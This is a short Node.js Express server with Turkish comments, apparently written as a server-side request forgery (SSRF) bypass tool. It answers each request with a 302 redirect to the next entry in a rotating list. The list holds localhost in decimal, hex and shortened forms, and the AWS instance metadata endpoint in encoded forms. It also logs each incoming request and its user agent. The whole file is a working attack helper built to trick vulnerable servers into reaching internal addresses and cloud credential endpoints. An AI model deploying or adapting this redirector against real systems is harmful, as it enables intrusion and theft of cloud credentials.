const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Denenecek bypass hedeflerinin listesi
const bypassTargets = [
    'http://2130706433',            // Decimal (127.0.0.1)
    'http://0x7f000001',          // Hexadecimal (127.0.0.1)
    'http://127.1',               // Short IP
    'http://2852039166/latest/meta-data/', // AWS Metadata Decimal
    'http://0xa9fea9fe/latest/meta-data/'  // AWS Metadata Hex
];

let currentIndex = 0;

app.use((req, res, next) => {
    console.log(`\n--- YENİ İSTEK: ${req.method} ${req.url} ---`);
    console.log('User-Agent:', req.headers['user-agent']);
    next();
});

app.get('/', (req, res) => {
    // Listeden sıradaki hedefi seç
    const internalTarget = bypassTargets[currentIndex];
    
    console.log(`[!] Hedef #${currentIndex + 1} seçildi ➔ ${internalTarget}`);
    
    // Bir sonraki istek için indeksi artır, listenin sonuna gelince başa dön
    currentIndex = (currentIndex + 1) % bypassTargets.length;
    
    // Seçilen hedefə 302 çak
    return res.redirect(302, internalTarget);
});

app.listen(3000, () => {
    console.log("Döngülü Bypass Avcısı 3000 portunda devrede!");
});
